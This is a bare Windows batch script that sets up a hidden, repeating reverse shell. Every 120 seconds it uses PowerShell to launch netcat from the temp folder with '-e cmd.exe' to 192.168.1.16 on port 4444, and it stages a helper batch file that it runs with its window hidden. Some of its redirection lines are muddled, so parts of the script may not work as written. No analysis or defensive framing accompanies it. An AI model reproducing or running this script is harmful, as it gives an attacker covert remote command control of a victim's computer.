@echo off
set "batFilePath=%temp%\pro.bat"
if exist "%batFilePath%" (
    findstr /C:"@echo off" "%batFilePath%" >nul
    if errorlevel 1 (
        (echo @echo off & type "%batFilePath%") >"%batFilePath%.tmp"
        move /y "%batFilePath%.tmp" "%batFilePath%" >nul
    )
) else (
    echo @echo off >> "%batFilePath%"
    :loop > "%batFilePath%"
         powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden" > "%batFilePath%"
         timeout /t 120 >nul > "%batFilePath%"
    goto loop >"%batFilePath%" 
)
powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\pro.bat\" -WindowStyle Hidden"
